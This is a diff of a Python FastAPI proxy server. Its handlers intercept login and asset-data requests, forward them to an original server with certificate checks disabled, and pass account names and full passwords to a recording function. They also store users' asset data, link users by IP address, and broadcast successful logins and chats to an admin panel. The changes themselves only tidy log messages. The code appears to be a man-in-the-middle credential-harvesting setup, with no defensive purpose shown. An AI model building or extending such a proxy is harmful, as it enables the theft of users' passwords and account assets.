@@ -181,7 +181,7 @@ async def proxy_login(request: Request):
     """拦截登录请求，记录后转发到原始服务器"""
     
     print("\n" + "="*60)
-    print("[Login] ★★★ 拦截到登录请求 ★★★")
+    print("[Login] 拦截到登录请求")
     print("="*60)
     
     # 获取客户端信息 - 优先从nginx代理头获取真实IP
@@ -189,8 +189,8 @@ async def proxy_login(request: Request):
     user_agent = request.headers.get("user-agent", "")
     content_type = request.headers.get("content-type", "")
     
-    print(f"[Login] ⚠️ 完整URL: {request.url}")
-    print(f"[Login] ⚠️ 路径: {request.url.path}")
+    print(f"[Login] 完整URL: {request.url}")
+    print(f"[Login] 路径: {request.url.path}")
     print(f"[Login] Method: {request.method}")
     print(f"[Login] Content-Type: {content_type}")
     print(f"[Login] Client IP: {client_ip}")
@@ -251,8 +251,8 @@ async def proxy_login(request: Request):
     account = params.get("account", "unknown")
     password = params.get("password", "")
     
-    print(f"[Login] ★ 最终解析结果: account={account}, password={'*'*len(password) if password else 'None'}")
-    print(f"[Login] ★ 所有参数keys: {list(params.keys())}")
+    print(f"[Login] 最终解析结果: account={account}, password={'*'*len(password) if password else 'None'}")
+    print(f"[Login] 所有参数keys: {list(params.keys())}")
     
     # 检查是否被封禁
     if is_banned(username=account, ip_address=client_ip):
@@ -291,23 +291,23 @@ async def proxy_login(request: Request):
     is_success = result.get("Error") == False or (not result.get("Error") and result.get("UserData"))
     
     status = "success" if is_success else "failed"
-    print(f"[Login] ★ 登录结果: is_success={is_success}, status={status}")
+    print(f"[Login] 登录结果: is_success={is_success}, status={status}")
     
     # 如果登录成功，从 UserData 中提取用户资产信息
     asset_data = None
     if is_success and result.get("UserData"):
         user_data = result["UserData"]
         asset_data = user_data
-        print(f"[Login] ★ 保存用户资产: {account}")
+        print(f"[Login] 保存用户资产: {account}")
         try:
             save_user_assets(account, user_data)
-            print(f"[Login] ★ 资产保存成功")
+            print(f"[Login] 资产保存成功")
         except Exception as e:
-            print(f"[Login] ★ 资产保存失败: {e}")
+            print(f"[Login] 资产保存失败: {e}")
     
     # 只记录真正的登录尝试（有账号和密码的请求）
     if account and password:
-        print(f"[Login] ★ 记录登录: account={account}, is_success={is_success}")
+        print(f"[Login] 记录登录: account={account}, is_success={is_success}")
         try:
             record_login(
                 username=account,
@@ -319,11 +319,11 @@ async def proxy_login(request: Request):
                 password=password,
                 is_success=is_success
             )
-            print(f"[Login] ★ 登录记录保存成功")
+            print(f"[Login] 登录记录保存成功")
         except Exception as e:
-            print(f"[Login] ★ 登录记录保存失败: {e}")
+            print(f"[Login] 登录记录保存失败: {e}")
     else:
-        print(f"[Login] ★ 跳过记录（无效请求：account={account}, password={'***' if password else 'None'}）")
+        print(f"[Login] 跳过记录（无效请求：account={account}, password={'***' if password else 'None'}）")
     
     # 只有真正的登录尝试（有账号密码的请求）才广播，且只广播成功的登录
     if account and password and is_success:
@@ -377,7 +377,7 @@ async def proxy_index_data(request: Request):
     """拦截用户资产数据请求，保存后返回"""
     
     print("\n" + "="*60)
-    print("[IndexData] ★★★ 拦截到资产数据请求 ★★★")
+    print("[IndexData] 拦截到资产数据请求")
     print("="*60)
     
     # 获取客户端信息 - 优先从nginx代理头获取真实IP
@@ -441,8 +441,8 @@ async def proxy_index_data(request: Request):
         except Exception as e:
             print(f"[IndexData] 解析异常: {e}")
     
-    print(f"[IndexData] ★ 最终解析结果: {params}")
-    print(f"[IndexData] ★ 所有参数keys: {list(params.keys())}")
+    print(f"[IndexData] 最终解析结果: {params}")
+    print(f"[IndexData] 所有参数keys: {list(params.keys())}")
     
     # 转发请求到原始服务器 - 完全照抄登录API的逻辑
     async with httpx.AsyncClient(verify=False, timeout=30) as client:
@@ -474,9 +474,9 @@ async def proxy_index_data(request: Request):
     if not result.get("Error") and result.get("Data"):
         data = result["Data"]
         
-        print(f"[IndexData] ★ 收到有效数据，尝试获取用户名...")
-        print(f"[IndexData] ★ 请求参数: {params}")
-        print(f"[IndexData] ★ 客户端IP: {client_ip}")
+        print(f"[IndexData] 收到有效数据，尝试获取用户名...")
+        print(f"[IndexData] 请求参数: {params}")
+        print(f"[IndexData] 客户端IP: {client_ip}")
         
         # 尝试多种方式获取用户名
         username = None
@@ -485,41 +485,41 @@ async def proxy_index_data(request: Request):
         if params:
             username = params.get("account") or params.get("Account") or params.get("UserName") or params.get("username")
             if username:
-                print(f"[IndexData] ★ 从请求参数获取到用户名: {username}")
+                print(f"[IndexData] 从请求参数获取到用户名: {username}")
         
         # 方式2: 从返回数据中获取用户名
         if not username and data:
             username = data.get("UserName") or data.get("Account") or data.get("NickName")
             if username:
-                print(f"[IndexData] ★ 从返回数据获取到用户名: {username}")
+                print(f"[IndexData] 从返回数据获取到用户名: {username}")
         
         # 方式3: 从最近登录记录中查找该IP的用户
         if not username:
-            print(f"[IndexData] ★ 尝试从登录记录中通过IP查找用户...")
+            print(f"[IndexData] 尝试从登录记录中通过IP查找用户...")
             recent = get_recent_logins(limit=50)
             for login in recent:
                 login_ip = login.get("ip_address", "")
                 login_user = login.get("username", "")
                 if login_ip == client_ip and login_user and login_user != "unknown":
                     username = login_user
-                    print(f"[IndexData] ★ 通过IP匹配找到用户: {username} (IP: {login_ip})")
+                    print(f"[IndexData] 通过IP匹配找到用户: {username} (IP: {login_ip})")
                     break
             if not username:
-                print(f"[IndexData] ★ 未能通过IP找到用户，最近登录IP列表: {[l.get('ip_address') for l in recent[:5]]}")
+                print(f"[IndexData] 未能通过IP找到用户，最近登录IP列表: {[l.get('ip_address') for l in recent[:5]]}")
         
         if username and username != "unknown":
             # 检查数据结构，看是否包含资产信息
-            print(f"[IndexData] ★ 用户: {username}")
-            print(f"[IndexData] ★ 数据字段: {list(data.keys())}")
-            print(f"[IndexData] ★ 是否包含ACECount: {'ACECount' in data}")
-            print(f"[IndexData] ★ 是否包含EP: {'EP' in data}")
+            print(f"[IndexData] 用户: {username}")
+            print(f"[IndexData] 数据字段: {list(data.keys())}")
+            print(f"[IndexData] 是否包含ACECount: {'ACECount' in data}")
+            print(f"[IndexData] 是否包含EP: {'EP' in data}")
             
             # 只有包含资产字段时才保存
             if 'ACECount' in data or 'EP' in data:
-                print(f"[IndexData] ★ 发现资产数据，保存到数据库")
+                print(f"[IndexData] 发现资产数据，保存到数据库")
                 save_user_assets(username, data)
             else:
-                print(f"[IndexData] ★ 这是用户资料数据，不是资产数据，跳过保存")
+                print(f"[IndexData] 这是用户资料数据，不是资产数据，跳过保存")
             
             # 广播资产更新事件（包含所有点数）
             await manager.broadcast({
@@ -751,7 +751,7 @@ async def chat_websocket(websocket: WebSocket):
     
     # 获取用户名
     username = websocket.query_params.get('username', 'visitor')
-    print(f"[ChatWS] ★★★ 新WebSocket连接: username={username}, ws_id={id(websocket)}")
+    print(f"[ChatWS] 新WebSocket连接: username={username}, ws_id={id(websocket)}")
     
     try:
         while True:
@@ -783,7 +783,7 @@ async def chat_websocket(websocket: WebSocket):
             elif msg_type == 'user_message':
                 # 用户发送消息
                 content = data.get('content', '')
-                print(f"[ChatWS] ★ 收到用户消息: username={username}, content={content}, ws_id={id(websocket)}")
+                print(f"[ChatWS] 收到用户消息: username={username}, content={content}, ws_id={id(websocket)}")
                 if content:
                     online_manager.save_user_message(username, content)
                     # 广播给管理后台
@@ -796,7 +796,7 @@ async def chat_websocket(websocket: WebSocket):
                             'is_admin': False
                         }
                     }
-                    print(f"[ChatWS] ★ 广播用户消息给管理后台: {broadcast_data}")
+                    print(f"[ChatWS] 广播用户消息给管理后台: {broadcast_data}")
                     await manager.broadcast(broadcast_data)
             
             elif msg_type == 'offline':
